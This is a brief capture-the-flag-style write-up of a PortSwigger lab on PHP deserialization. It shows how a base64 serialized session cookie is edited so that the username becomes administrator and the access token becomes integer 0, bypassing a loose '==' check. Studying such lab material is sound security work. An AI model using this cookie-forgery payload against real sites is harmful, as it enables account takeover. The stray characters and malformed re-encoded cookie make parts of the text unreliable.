# [Modifying serialized data types](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)

> change the session token to contain admin privileges

- open the page in a browser
- log in with `wiener:peter`
- check the session cookie
- it should be something like this:

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJwcThnbXM0Nm1paTZid2Z2eDBmODExYmhieGF3YTgyNiI7fQ%3d%3d
```

- translate it from `base64`:

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"pq8gms46mii6bwfvx0f811bhbxawa826";}
ÝÝ
```

- change it to:

```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
ÝÝ
```

- translate it back to `base64`

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt93d0
```

- change the cookie session to that
- reload the page
- go to the admin panel
- delete carlos

## what happens

- something like this in the `PHP`

```php
if ($login['access_token'] == $accessToken) {
// you are the real user
}
```

- The `access_token` in your cookie is compared against the real token stored for that account, using PHP's loose `==` operator.
- When you change the token to the integer 0, PHP compares:

```php
0 == "the_real_administrator_token"
```

- where it results `true` because the string results to `0`
